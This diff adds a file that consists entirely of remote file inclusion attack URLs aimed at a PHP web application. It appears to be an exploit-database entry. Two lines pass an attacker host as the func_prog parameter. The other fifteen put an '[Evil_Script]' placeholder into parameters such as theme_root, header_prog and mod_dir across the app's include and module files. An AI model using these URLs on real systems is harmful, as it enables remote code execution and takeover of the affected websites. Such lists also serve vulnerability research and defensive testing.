@@ -1,0 +1,17 @@
+http://www.example.com/preload.php?config=owned&func_prog=http://attacker
+http://www.example.com/index.php?config=owned&func_prog=http://attacker
+http://www.example.com/missing.php?header_prog=[Evil_Script]
+http://www.example.com/_inc/footer.php?theme_root=[Evil_Script]
+http://www.example.com/_inc/header.php?mod_root=[Evil_Script]
+http://www.example.com/_inc/header.php?theme_root=[Evil_Script]
+http://www.example.com/_inc/pfooter.php?theme_root=[Evil_Script]
+http://www.example.com/_inc/pheader.php?theme_root=[Evil_Script]
+http://www.example.com/_inc/web_statsConfig.php?mod_dir=[Evil_Script]
+http://www.example.com/_inc/web_statsConfig.php?php_ext=[Evil_Script]
+http://www.example.com/_mods/email.php?header_prog=[Evil_Script]
+http://www.example.com/_mods/files.php?header_prog=[Evil_Script]
+http://www.example.com/_mods/files.php?footer_prog=[Evil_Script]
+http://www.example.com/_mods/headlines.php?header_prog=[Evil_Script]
+http://www.example.com/_mods/search.php?header_prog=[Evil_Script]
+http://www.example.com/_mods/topics.php?header_prog=[Evil_Script]
+http://www.example.com/_mods/users.php?header_prog=[Evil_Script]
